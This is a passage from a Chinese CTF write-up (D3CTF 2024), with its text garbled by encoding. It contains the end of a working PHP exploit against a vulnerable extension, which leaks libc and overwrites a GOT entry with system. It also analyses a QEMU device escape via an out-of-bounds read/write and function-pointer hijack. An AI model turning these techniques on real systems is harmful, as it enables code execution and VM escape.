class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$x</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system_addr</span> = <span class="number">0x4c490</span>;</span><br><span class="line"><span class="variable">$efree_got</span> = <span class="number">0x4038</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>, <span class="number">0x3f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">0xe</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="number">0x61</span> + <span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$aa</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>, <span class="variable">$n</span>);</span><br><span class="line">    <span class="variable">$aaa</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$aa</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="variable">$aaa</span>, <span class="variable">$b</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;/readflag &gt; /var/www/html/flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">0</span>,<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">7</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;c&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">8</span>, <span class="title function_ invoke__">int2str</span>(<span class="variable">$mod_base</span>+<span class="variable">$efree_got</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">int2str</span>(<span class="variable">$libc_base</span>+<span class="variable">$system_addr</span>),<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$payload</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>è¿™é“é¢˜æˆ‘æ„Ÿè§‰éš¾ç‚¹åœ¨äºå¦‚ä½•è°ƒè¯•ã€‚è¿™é“é¢˜ç›®ç»™å‡ºäº† <code>docker</code> ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ <code>docker</code> ä¸­å¯åŠ¨ <code>gdbserver</code> è¿œç¨‹è°ƒè¯•ï¼Œå…¶åšæ³•å¦‚ä¸‹ï¼š  </p><img src="/2024/04/29/d3ctf2024/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç„¶ååœ¨å¦å¤–ä¸€ä¸ªç»ˆç«¯ä¸­å¯åŠ¨ <code>gdb</code>ï¼Œç„¶åè¾“å…¥ <code>target remote:8888</code> å³å¯è¿æ¥<br>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ <code>docker</code> æ˜¯å°†å…¶ <code>9999</code> ç«¯å£æ˜ å°„åˆ°ç‰©ç†æœºçš„ <code>8888</code> ç«¯å£ï¼Œæ‰€ä»¥æˆ‘åœ¨ <code>docker</code> ä¸­å¯åŠ¨ <code>gdbserver</code> ä½¿ç”¨çš„æ˜¯ <code>9999</code> ç«¯å£ï¼Œåœ¨ç‰©ç†æœºä¸­ <code>gdb</code> è¿œç¨‹è¿æ¥çš„ç«¯å£æ˜¯ <code>8888</code><br>ç”±äºé¢˜ç›®ç»™çš„ <code>docker</code> å¹¶æ²¡æœ‰å®‰è£… <code>gdbserver</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™æ¡å‘½ä»¤è¿›è¡Œå®‰è£…  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install gdbserver</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±è¦è¯´è¯´è°ƒè¯•æŠ€å·§ã€‚ç”±äºç¨‹åºè¦è¿è¡Œå¾ˆå¤šæ±‡ç¼–ä»£ç åæ‰ä¼šå°† <code>vuln.so</code> æ¨¡å—ç»™åŠ è½½è¿›æ¥ï¼Œæ‰€ä»¥ä¸€ç›´åœ¨ <code>gdb</code> ä¸­ä½¿ç”¨ <code>si</code> æ˜¯è¡Œä¸é€šçš„ï¼Œæˆ‘çš„æ–¹æ³•æ˜¯åœ¨ <code>exp.php</code> ä¸­ä½¿ç”¨ <code>fgetc(STDIN)</code> æ¥å°†ç¨‹åºå¡ä½ï¼Œç„¶ååœ¨ <code>gdb</code> ä¸­è¾“å…¥ <code>c</code> æ¥è¿›è¡Œç±»ä¼¼äºæ–­ç‚¹çš„æ“ä½œï¼Œä½†æ˜¯è¿™æ ·çš„ <code>php</code> æ–‡ä»¶è¿è¡Œæ—¶ä¼šå‘ç°ç³»ç»ŸæŠ¥é”™è¯´æ‰¾ä¸åˆ° <code>fgetc</code> è¿™ä¸€ä¸ª <code>function</code>ï¼Œè¿™æ˜¯åº”ä¸ºåœ¨ <code>php.ini</code> æ–‡ä»¶ä¸­å°†è¿™ä¸€ä¸ªå‡½æ•°ç»™ <code>ban</code> äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™ä¸€æ¡æŒ‡ä»¤æ¥æ‰¾åˆ° <code>php.ini</code> æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep <span class="string">&quot;Configuration File (php.ini) Path&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>php.ini</code> æ–‡ä»¶ä¸­æˆ‘ä»¬æ‰¾åˆ° <code>disable_functions</code> é‚£ä¸ªåœ°æ–¹  </p><img src="/2024/04/29/d3ctf2024/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§æˆ‘ä»¬è¦ç”¨çš„ <code>fgetc</code> å‡½æ•°åœ¨æœ€åä¸€è¡Œï¼Œæˆ‘ä»¬å°†å…¶åˆ é™¤å³å¯<br>ä¸‹é¢ç»™å‡ºä¸€æ¡ç”¨äºæŸ¥è¯¢ <code>php</code> æ‰©å±•æ¨¡å—æ‰€åœ¨çš„è·¯å¾„çš„å‘½ä»¤  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php-config --extension-dir</span><br></pre></td></tr></table></figure><h1 id="D3EasyEscape"><a href="#D3EasyEscape" class="headerlink" title="D3EasyEscape"></a>D3EasyEscape</h1><p>è¿™é“é¢˜æ˜¯ <code>qemu</code> é€ƒé€¸ï¼Œä¹‹å‰æ²¡äº‹å¹²å­¦äº†ä¸€ä¸‹ï¼Œè¿™ä¸åˆšå¥½å¯ä»¥ç”¨ä¸Šäº†ï¼Œå…¶å…³é”®å‡½æ•°å¦‚ä¸‹ï¼š<br>l0dev_mmio_readï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_mmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">82LL</span>, <span class="string">&quot;l0dev_mmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v6 + <span class="number">0xA00</span>) + addr) + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_readï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_pmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">104LL</span>, <span class="string">&quot;l0dev_pmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)dest == <span class="number">666</span> )</span><br><span class="line">    ++dword_123B1CC;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_mmio_writeï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size_n; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  _QWORD n_4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> addr_v7; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  n_4[<span class="number">2</span>] = opaque;</span><br><span class="line">  n_4[<span class="number">1</span>] = addr;</span><br><span class="line">  n_4[<span class="number">0</span>] = value;</span><br><span class="line">  size_n = size;</span><br><span class="line">  v8 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">133LL</span>, <span class="string">&quot;l0dev_mmio_write&quot;</span>);</span><br><span class="line">  v9 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)addr;</span><br><span class="line">  addr_v7 = addr;</span><br><span class="line">  <span class="keyword">if</span> ( size_n &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * v9 + size_n);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = n_4[<span class="number">0</span>];</span><br><span class="line">        addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr_v7 == <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">void</span> *)n_4[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( n_4[<span class="number">0</span>] &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="type">void</span> *)v8;</span><br><span class="line">          *(_DWORD *)(v8 + <span class="number">0xA00</span>) = n_4[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_writeï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_pmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = opaque;</span><br><span class="line">  addr_v6 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = value;</span><br><span class="line">  n[<span class="number">0</span>] = size;</span><br><span class="line">  v9 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">173LL</span>, <span class="string">&quot;l0dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_123B1CC )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v9 + <span class="number">0xA00</span>) + addr_v6) + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">  result = (<span class="type">void</span> *)(addr_v6 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  addr_v10 = addr_v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n[<span class="number">0</span>] &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * addr_v10 + n[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = addr_v6;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr_v6 + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯´å®è¯ï¼Œè¿™é“é¢˜ç›®æˆ‘çœ‹äº†å¥½ä¹…æ‰æ‰¾åˆ°æ¼æ´ï¼Œè¿˜æ˜¯åšé¢˜åšå¤ªå°‘äº†ã€‚åœ¨ <code>l0dev_mmio_write</code> å‡½æ•°ä¸­å½“ <code>addr_v7 == 0x80</code> æ—¶æˆ‘ä»¬å¯ä»¥å¯¹ <code>*(_DWORD *)(v8 + 0xA00)</code> çš„å€¼è¿›è¡Œè®¾ç½®ï¼Œè€Œåœ¨ <code>l0dev_mmio_read</code> å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥ç›¸å¯¹ <code>*(_DWORD *)(v8 + 0xA00)</code> æŸä¸ªåç§»èŒƒå›´å†…çš„æ•°æ®è¿›è¡Œè¯»ï¼Œåœ¨ <code>l0dev_pmio_write</code> å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥ç›¸å¯¹ <code>*(_DWORD *)(v8 + 0xA00)</code> æŸä¸ªåç§»èŒƒå›´å†…çš„æ•°æ®è¿›è¡Œå†™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå­˜åœ¨è¶Šç•Œè¯»å’Œè¶Šç•Œå†™ã€‚è§‚å¯Ÿåˆ° <code>l0dev_mmio_write</code> å‡½æ•°ä¸­ä¸‹é¢è¿™ä¸€æ®µä»£ç ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )&#123;</span><br><span class="line">    v10 = n_4[<span class="number">0</span>];</span><br><span class="line">    addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§ <code>(int (__fastcall **)(_QWORD *))(v8 + 0xD48)</code> å¤„å­˜å‚¨çš„æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡ <code>gdb</code> æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å­˜å‚¨çš„æ˜¯ <code>rand_r</code> å‡½æ•°çš„åœ°å€ï¼Œè¯¥å‡½æ•°ä½äº <code>libc</code> ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¶Šç•Œè¯»è¯»å–æ­¤å¤„æ¥è·å– <code>libc</code> çš„åœ°å€ã€‚å¯ä»¥çœ‹è§è¿™ä¸ªåœ°æ–¹æ˜¯é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨äº†å‡½æ•°ï¼Œä¸”å‡½æ•°çš„å‚æ•°æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åŠ«æŒè¯¥å‡½æ•°æŒ‡é’ˆæ‰§è¡Œ <code>system</code> å‡½æ•°çš„åœ°å€ï¼Œç„¶åå¦å‡½æ•°ä»å‚æ•°ä¸º <code>sh</code> å³å¯å®ç°é€ƒé€¸<br>expï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 